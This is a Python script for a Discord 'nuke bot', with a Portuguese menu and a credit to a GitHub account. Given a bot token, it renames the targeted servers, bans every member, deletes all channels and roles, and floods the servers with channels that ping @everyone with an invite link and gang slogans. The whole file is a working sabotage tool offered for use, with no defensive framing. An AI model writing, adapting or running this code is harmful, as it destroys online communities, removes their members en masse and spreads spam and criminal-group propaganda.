import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit

init()

dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text): print(text, end=''); return input()

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Feito por: {g}https://github.com/SrDark222'''

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned

async def create_roles(guild, name):
    created = 0
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=name)
            created += 1
        except:
            continue
    return created

async def create_text_channels(guild, name):
    created = 0
    for _ in range(100 - len(guild.text_channels)):
        try:
            channel = await guild.create_text_channel(name=name)
            await channel.send("@everyone @here\n\n# DKZIN DOMINA\nhttps://discord.com/invite/gZSx3n8Csa\n\n## TERCEIRO COMANDO NA FRENTE DE TODOS")
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(100 - len(guild.voice_channels)):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'{r}Nuke: {m}{guild.name}')
    await guild.edit(name="TERCEIRO COMANDO DA CAPITAL 🇮🇶")
    banned = await ban_all_members(guild)
    print(f'{m}Banidos:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Canais deletados:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}Papéis deletados:{b}{delete_roles}')
    created_text_channels = await create_text_channels(guild, name)
    print(f'{m}Canais de texto criados:{b}{created_text_channels}')
    created_voice_channels = await create_voice_channels(guild, name)
    print(f'{m}Canais de voz criados:{b}{created_voice_channels}')
    print(f'{r}--------------------------------------------\n\n')

while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
    {y}└─[2] {m}- {g}Sair
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Insira o token do bot:{g}')
        name = _input(f'{y}Insira o nome para os canais / papéis criados:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Selecionar]
    {y}└─[1] {m}- {g}Nuke de todos os servidores.
    {y}└─[2] {m}- {g}Nuke de apenas um servidor.  
    {y}└─[3] {m}- {g}Sair
{y}====>{g}''')
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logado como {client.user.name}
[+]Bot em {len(client.guilds)} servidores!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id = _input(f'{y}Insira o ID do servidor:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild)
                await client.close()
        elif choice_type == '3':
            print(f'{dr}Saindo...')
            exit()
        try:
            client.run(token)
            input('Nuke concluído, pressione Enter para retornar ao menu...')
        except Exception as error:
            if str(error) == "Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.":
                input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para retornar...')
            else:
                input(f'{r}{error}\n{b}Pressione Enter para retornar...')
            continue
    elif choice == '2':
        print(f'{dr}Saindo...')
        exit()
